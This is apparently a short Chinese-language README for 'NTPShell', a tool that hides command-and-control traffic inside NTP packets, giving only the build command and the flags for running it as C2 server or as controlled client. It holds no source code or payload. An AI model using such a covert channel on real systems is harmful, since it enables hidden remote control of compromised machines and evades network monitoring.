# NTPShell
通过NTP协议来负载C2数据。                 
**编译**           
gcc ntp.c -lpthread -o ntp
# 使用                           
c2服务端：./ntp -S                  
c2被控端：./ntp -C -s {server_addr}                
